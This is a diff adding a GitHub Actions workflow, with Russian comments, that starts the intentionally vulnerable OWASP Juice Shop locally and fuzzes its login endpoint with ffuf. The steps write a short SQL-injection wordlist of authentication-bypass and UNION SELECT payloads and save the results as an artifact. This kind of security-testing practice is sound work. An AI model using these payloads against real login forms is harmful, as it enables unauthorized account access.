@@ -1,0 +1,67 @@
+name: Fuzz Juice Shop Login
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  fuzz:
+    runs-on: ubuntu-latest
+
+    steps:
+    # 1. Забираем код репозитория
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    # 2. Устанавливаем Docker
+    - name: Install Docker
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y docker.io
+        sudo systemctl start docker
+
+    # 3. Запускаем Juice Shop
+    - name: Run Juice Shop
+      run: |
+        docker run -d -p 3000:3000 bkimminich/juice-shop
+        sleep 20
+
+    # 4. Устанавливаем ffuf
+    - name: Install ffuf
+      run: |
+        sudo apt-get install -y ffuf
+
+    # 5. Создаём словарь SQL-инъекций (SQLite)
+    - name: Create SQL injection wordlist
+      run: |
+        mkdir wordlists
+        cat <<EOF > wordlists/sql.txt
+        ' OR '1'='1
+        ' OR 1=1--
+        ' OR 1=1#
+        ' OR 'a'='a
+        admin' --
+        admin' #
+        ' UNION SELECT null--
+        ' UNION SELECT sqlite_version()--
+        EOF
+
+    # 6. Запускаем фаззинг логина
+    - name: Run ffuf against login
+      run: |
+        mkdir results
+        ffuf -u http://localhost:3000/rest/user/login \
+        -X POST \
+        -H "Content-Type: application/json" \
+        -d '{"email":"FUZZ","password":"test"}' \
+        -w wordlists/sql.txt \
+        -mc all \
+        -of json \
+        -o results/ffuf-login.json
+
+    # 7. Сохраняем результаты как артефакт
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: security-reports-bundle
+        path: results
